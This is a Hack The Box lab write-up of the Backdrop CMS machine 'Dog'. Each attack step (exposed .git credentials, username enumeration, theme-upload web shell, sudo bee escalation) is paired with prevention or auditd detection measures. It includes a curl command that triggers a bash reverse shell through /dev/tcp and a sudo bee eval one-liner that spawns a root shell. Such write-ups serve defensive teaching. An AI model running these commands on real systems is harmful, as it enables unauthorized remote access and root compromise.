---
title: Dog
date: 2025-07-31 00:00:00 -0800
categories: [Patch the Box]
tags: [hack the box,linux,web-app,php,backdrop,auditd]
description: This machine involves an open source CMS web application. I go over some relatively easy fixes that can be applied with built in Linux services, with the exception of installing auditd for detections.
image:
  path: https://i.postimg.cc/KzWXtWmz/dog-preview.png 
---

### Overview

Dog is the name of this easy Hack The Box Linux machine which centers around the PHP based Backdrop CMS web application. The box is hampered by poor implementation issues, password reuse, and some abusable features of Backdrop that led to compromise. As the attack paths are walked through I discuss steps to prevent or detect those activities with OS features, PHP code modifications, and use of auditd logging.

### Attack Tactics

#### Reconnaissance (Git Repo Exposure)
As is typical one of the first things I did was run an nmap scan against the machine's IP to scan all TCP ports. I will usually run a quick UDP scan as well and a more comprehensive UDP scan later if initial recon and enumeration seems to warrant wider scanning. In this case, and considering the easy rating, port 80 showed enough promise to focus efforts there. Nmap http script scans showed a `.git` directory available and identified Backdrop CMS as a couple of the most notable items. I looked over the website to understand what type of functionality was offered and a login page seemed interesting. It was almost immediately obvious that username enumeration may be likely since a login test attempt provided a "Sorry, unrecognized username." response. I will cover testing the login page more in the next section. With the git directory being directly accessible I next looked there for valuable data. One of the first things noticed was contents of the `settings.php` page with MySQL credentials at the top.

![image](https://i.postimg.cc/4N1GB88w/dog-db-credentials.png){: width='651' height='171'}

Checking the credentials and common combinations of different usernames with the password against SSH and the website's login didn't work so I went back to reviewing the git repo. I had downloaded the directory to my machine, usually when looking through multiple levels of files and directories I'll use `ranger` (described as "a VIM-inspired filemanager for the console"[^1]) first to scan contents and quickly understand the structure. With some persistence when looking through the various files I saw an email address `tiffany@dog.htb` in the `update.settings.json` file.

This is thinking retrospectively, but using grep to recursively search the git repo for the common htb TLD or box name would have helped as well. Reviewing the `settings.php` file more closely would have also pointed me in the right direction quicker by looking into the `config_directories` variable and associated path it was set to.

```bash
grep -r 'htb\b' .
```

![image](https://i.postimg.cc/05zq1Y8d/dog-config-directories.png){: width='727' height='262'}

> __Prevent:__ An easy prevention measure for this is to not expose the `.git` directory which can be achieved by updating the file permissions with `chmod`:
{: .prompt-tip}

```bash
chmod -R 750 .git
``` 

This will update permissions so "others" (`0` position) no longer have access to the directory and sub-directories. Subsequent attempts to access the directory will return a 401 Forbidden response. This may be the quickest modification to make although ideally the repository would not be placed in the web directory.

#### Reconnaissance (CWE-200)
Returning to the login page, given that a username was discovered and the login page was already thought to allow for username enumeration, this theory was tested and looked to validate the account:

![image](https://i.postimg.cc/28dcsyB7/dog-username-enum.png){: width='556' height='342'}

Then pairing the username with the prior password validated access to the Backdrop web console. This is a design decision either through oversight or prioritizing ease of use when a legitimate user mistakenly forgets or mistypes their password. The end result is that "there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function..."[^2].

> __Prevent:__ An example to rectify this would be to update the PHP source to generalize authentication failures and its response, for example to: "Sorry, incorrect username or password.":
{: .prompt-tip}

`/var/www/html/core/modules/user/user.module`
![image](https://i.postimg.cc/Zn3Cn1h6/dog-user-module-update.png){: width='1525' height='251'}

The second highlighted section also updated the first `form_set_error` parameter's value to `name` to match the first one. This way the visual response in the UI is the same where focus is always returned to the username text box.

To validate this prevention measure I first checked the msyql database to see all the current users:

```bash
jPAdminB
jobert
dogBackDropSystem
john
morris
axel
rosa
tiffany
```

Then used an additional eight nonsense usernames to send as login requests with `ffuf`. What follows were commands ran before and after the PHP code was updated, followed by the labeled output for each. In the "Post" command I added "Sorry, unrecognized username." as text to be filtered out from the responses (with the `fr` parameter) to further validate that the original PHP code response was not being returned anymore. The `req` file was saved from Burp when proxying one of the login request.

__Pre__ PHP code update
```bash
ffuf -request req -request-proto http -w test_usernames.txt
```

__Post__ PHP code update
```bash
ffuf -request req -request-proto http -w test_usernames.txt -fr 'Sorry, unrecognized username.'
```

![image](https://i.postimg.cc/nz7t8Zxb/dog-ffuf-usernames.png){: width='1500' height='295'}

In the "Pre" output I have the Word count highlighted that matches with valid usernames, whereas the "Post" output all have the same Word counts. The Duration values at first glance don't appear to show a pattern within each test case, this could be analyzed across larger samples more thoroughly to see if a pattern emerges. In either case, aside from the `form_set_error` changes that were done specifically for this machine's implementation it would be ideal to also mimic the same changes for the other cases in the `user.module` file (i.e., if email addresses are used for the username) as well. 

#### Initial Access (Exploit Backdrop Upload Feature)

Once logged into the Backdrop application with `tiffany`'s account the navigation bar referenced admin functionality and a quick search for exploits initially led me to [EBD-ID: 52021 - Backdrop CMS 1.27.1 - Authenticated RCE](https://www.exploit-db.com/exploits/52021), the machine's version matched up but I was receiving an "Unable to create directory..." error when trying to do a manual installation. Later I came across this [Backdrop CMS 1.22.0 â€” Unrestricted File Upload (Themes)](https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-themes-ad42a599561c) article that describes the same steps manually instead with a Theme upload. From [Backdrops's Theme page](https://backdropcms.org/themes) I downloaded the first theme, extracted it and put a simple `shell.php` web shell in that directory. After re-archiving the folder as a `.tgz` and uploading, the web shell was accessible and allowed for a reverse shell connection under the `www-data` account:

![image](https://i.postimg.cc/j2fqh9vv/dog-web-shell.png){: width='802' height='75'}

```bash
curl "$IP/themes/shaperrific/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.120%2F443%200%3E%261%22"
```

Checking `/etc/passwd` I could see two interesting accounts, `jobert` and `johncusak` and there was also a `/backdrop_tool` directory which comes into play in the Privilege Escalation section. I spent some time looking for sensitive files and enumerated the database but was not uncovering anything useful. Checking for password re-use again though validated the originally discovered password also paired with the `johncusak` account and allowed for SSH access.

> __Detect:__ Looking for related malicious activity seems more appropriate given that legitimate Themes for the application use PHP files. For this I used `auditd` to look for process executions from the `www-data` account's effective UID 33:
{: .prompt-tip}

This process took a few steps due to the Dog machine not having an Internet connection to install `auditd` with `apt`. I used a socks proxy with SSH so my Kali machine's connection could be utilized. This way `apt` could be used on the victim machine, which seemed to be the preferred install method.

1. 
Connect to my machine from Dog on an arbitrary port, `-D` enables a dynamic socks proxy:
```bash
ssh -D 1080 lowpriv@<MY_IP> -p 8822
vim /etc/apt/apt.conf.d/99proxy
```

2. 
`99proxy`:
```
Acquire::http::Proxy "socks5h://127.0.0.1:1080";
Acquire::https::Proxy "socks5h://127.0.0.1:1080";
```

3. 
```bash
apt install auditd audispd-plugins
```

I referred to this [Hunting for Persistence in Linux](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/#02-auditd-andsysmon) article to add detections with key name `detect_execve_www`:

```bash
auditctl -a always,exit -F arch=b64 -F euid=33 -S execve -k detect_execve_www  
auditctl -a always,exit -F arch=b32 -F euid=33 -S execve -k detect_execve_www
```

With the web shell I ran some enumeration commands and used the `ausearch` to look for the related key name and highlight where some of the command arguments start. A more robust solution would be to forward these to a SIEM. In some of my other posts I have detailed steps to use [Splunk](https://erlaplante.github.io/tags/splunk/) or [Wazuh](https://erlaplante.github.io/tags/wazuh/) which can be found with respective tags.

```bash
ausearch -k detect_execve_www | grep -E 'a0|a1'
```

![image](https://i.postimg.cc/yxBMt8HJ/dog-ausearch.png){: width='802' height='162'}


#### Privilege Escalation (Excessive Sudo Access)

Once logged in as `johncusak` I listed privileges with `sudo -l` since his password was known.

![image](https://i.postimg.cc/0QDDztDR/dog-bee.png){: width='957' height='460'}

It seemed likely that the `bee` PHP script would have some sort of functionality that could be abused to escalate privileges. I first looked at the help options when running `bee` and later came across this [Linux Privilege Escalation Techniques - BackDrop CMS](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html) article which clearly showed that specifying the application path would resolve the referenced "bootstrap level" error that I was receiving when running eval without that path:

```bash
sudo bee --root=/var/www/html eval "system('/bin/bash');"
```

> __Prevent:__ To control these excessive permissions either sudo access should be removed or only allow specific commands as necessary. This would depend on the specific use case for this tool and the risk appetite for the involved decision makers:
{: .prompt-tip}

An example prevention measure would be modifying the `sudoers` file to only allow the `version` command argument (updating what's allowed as necessary):

```bash
visudo /etc/sudoers
```

Testing this shows the intended functionality still working and unintended failing:

![image](https://i.postimg.cc/26M9DXYs/dog-sudoers-update.png){: width='1067' height='103'}

### Further Reading

- [Backdrop GitHub Repository](https://github.com/backdrop/backdrop)
- [Bee Github Repository](https://github.com/backdrop-contrib/bee)
- [CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [PortSwigger - File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [Backdrop CMS 1.22.0 â€” Unrestricted File Upload (Themes)](https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-themes-ad42a599561c)
- [Linux Privilege Escalation Techniques - BackDrop CMS](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html)
- [Hunting for Persistence in Linux](https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell/#02-auditd-andsysmon)
- [Monitoring root actions on Linux using Auditd and Wazuh](https://wazuh.com/blog/monitoring-root-actions-on-linux-using-auditd-and-wazuh/)
- [A Deep Dive into the Sudoers File](https://www.digitalocean.com/community/questions/a-deep-dive-into-the-sudoers-file)

#### Footnotes
[^1]: [https://github.com/ranger/ranger](https://github.com/ranger/ranger)
[^2]: [https://cwe.mitre.org/data/definitions/200.html](https://cwe.mitre.org/data/definitions/200.html)
